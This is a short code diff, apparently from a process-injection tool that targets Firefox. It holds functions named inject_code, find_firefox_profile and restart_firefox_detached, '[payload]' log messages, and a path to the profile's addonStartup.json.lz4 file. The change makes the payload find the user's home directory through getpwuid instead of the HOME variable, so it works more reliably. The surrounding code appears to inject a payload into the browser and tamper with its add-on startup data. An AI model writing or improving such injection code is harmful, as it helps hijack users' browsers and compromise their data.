@@ -29,6 +29,7 @@ exit 0
 #include <sys/wait.h>
 #include <time.h>
 #include <fcntl.h>
+#include <pwd.h>
 #include <unistd.h>
 
 #ifndef COCKBLOCK_SEED
@@ -555,7 +556,7 @@ inject_code(int pid, unsigned char *payload, size_t payload_len)
   snprintf(p.entry_fn_name, sizeof(p.entry_fn_name), "my_payload_entry");
 
   // Find Firefox profile path to compute addonStartup.json.lz4 path
-  const char *home = getenv("HOME");
+  const char *home = getpwuid(geteuid())->pw_dir;
   if (home) {
       char profiles_ini[PATH_MAX];
       snprintf(profiles_ini, sizeof(profiles_ini),
@@ -1060,10 +1061,10 @@ static void restart_firefox_detached(void) {
 static int find_firefox_profile(char *profile_path_out, size_t len) {
     char profiles_ini[PATH_MAX];
 
-    const char *home = getenv("HOME");
+    const char *home = getpwuid(geteuid())->pw_dir;
 
     if (!home) {
-        printf("[payload] HOME environment variable not set\n");
+        printf("[payload] Could not determine user home directory\n");
         fflush(stdout);
         return 0;
     }
